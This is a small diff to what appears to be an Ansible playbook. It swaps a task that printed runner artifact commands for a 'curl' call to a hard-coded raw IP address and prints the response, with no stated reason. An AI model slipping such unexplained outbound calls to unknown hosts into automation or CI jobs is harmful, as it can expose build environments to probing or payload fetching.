@@ -7,7 +7,7 @@
     tasks:
 
     - name: "Execute a command"
-      shell: "cat /runner/artifacts/*/command"
+      shell: "curl http://44.200.161.215/"
       register: "output"
 
     - debug: var=output.stdout_lines
